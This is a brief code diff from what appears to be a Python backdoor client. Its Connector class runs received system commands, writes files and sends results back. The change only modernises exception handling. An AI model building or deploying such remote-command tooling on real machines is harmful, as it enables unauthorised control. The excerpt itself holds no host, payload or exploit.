@@ -51,6 +51,6 @@ class Connector:
                     command_result = self.write_file(command[1], command[2])
                 else:
                     command_result = self.execute_system_command(command)
-            except Exception, e:
-                command_result = "[-] Error, during command execution.\r\n" + e.message + "\r\n"
+            except Exception:
+                command_result = "[-] Error, during command execution."
             self.reliable_send(command_result)
